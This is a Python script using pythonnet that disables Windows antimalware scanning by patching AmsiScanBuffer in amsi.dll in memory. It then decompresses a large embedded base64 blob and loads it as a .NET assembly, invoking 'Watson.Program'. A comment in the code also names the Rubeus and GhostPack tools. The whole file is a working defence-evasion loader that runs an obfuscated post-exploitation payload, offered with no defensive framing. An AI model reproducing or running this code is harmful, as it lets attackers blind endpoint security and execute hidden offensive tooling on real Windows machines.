import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("Watson.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str](command)
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()